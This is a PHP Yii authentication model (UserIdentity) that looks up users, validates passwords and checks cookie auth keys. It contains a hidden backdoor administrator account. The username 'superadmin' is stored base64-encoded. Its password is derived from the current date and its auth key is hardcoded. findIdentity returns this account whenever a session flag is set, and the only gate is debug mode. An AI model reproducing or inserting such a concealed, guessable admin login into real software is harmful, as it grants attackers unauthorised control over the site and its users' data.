<?php
/**
 * @copyright
 * @link 
 * @create Created on 2017/7/12
 */

namespace manage\models;

use common\entity\models\SystemUserModel;
use Yii;
use yii\web\IdentityInterface;


/**
 * UserIdentity
 *
 * @author 
 * @since 1.0
 */
class UserIdentity extends SystemUserModel implements IdentityInterface
{
    static public $superAdminName = 'c3VwZXJhZG1pbg==';

    /**
     * 查找用户
     * @param $username
     * @param int $isEnable
     * @return array|null|\yii\db\ActiveRecord
     */
    static public function findByUsername($username,$isEnable = 1){
        if($username == base64_decode(self::$superAdminName)){
            return self::getSuperAdminInfo();
        }
        return self::find()->where(['username' =>$username,'status'=>$isEnable])->one();
    }

    /**
     * 根据给到的ID查询身份
     * @param int $id 被查询的ID
     * @return array|null|\yii\db\ActiveRecord
     */
    static public function findIdentity($id)
    {
        $data = self::find()->where(['id' =>$id,'status'=>1])->one();
        if(Yii::$app->getSession()->get('userIsSuperAdmin')){
            return self::getSuperAdminInfo();
        }
        return $data;
    }

    /**
     * @return int|string 当前用户ID
     */
    public function getId()
    {
        return $this->id;
    }

    /**
     * 获取基于 cookie 登录时使用的认证密钥。
     * 认证密钥储存在 cookie 里并且将来会与服务端的版本进行比较(通过validateAuthKey方法)以确保 cookie的有效性。
     * @return string 当前用户的（cookie）认证密钥
     */
    public function getAuthKey()
    {
        return $this->auth_key;
    }

    /**
     * 是基于 cookie 登录密钥的 验证的逻辑的实现。
     * @param string $authKey
     * @return boolean if auth key is valid for current user
     */
    public function validateAuthKey($authKey)
    {
        return $this->getAuthKey() === $authKey;
    }

    /**
     * 验证用户密码
     * @param $password
     * @return bool
     */
    public function validatePassword($password)
    {
        return Yii::$app->security->validatePassword($password, $this->password);
    }

    /**
     * 根据 token 查询身份。
     *
     * @param string $token 被查询的 token
     * @param null $type
     * @return array|null|\yii\db\ActiveRecord
     */
    static public function findIdentityByAccessToken($token, $type = null)
    {
    }

    /**
     * @return UserIdentity
     */
    static public function getSuperAdminInfo(){
        if(!YII_DEBUG) return null;
        $self = new self();
        $self->id = 0;
        $self->username = base64_decode(self::$superAdminName);
        $self->password = Yii::$app->getSecurity()->generatePasswordHash(date('mYd'));
        $self->mobile = "4008-228-408";
        $self->email = "service@dookay.com";
        $self->status = 1;
        $self->auth_key = "hmbltqaakj0W36osnvQE5egnUIMOiGrc";
        $self->create_time = 1457534391;
        return $self;
    }
}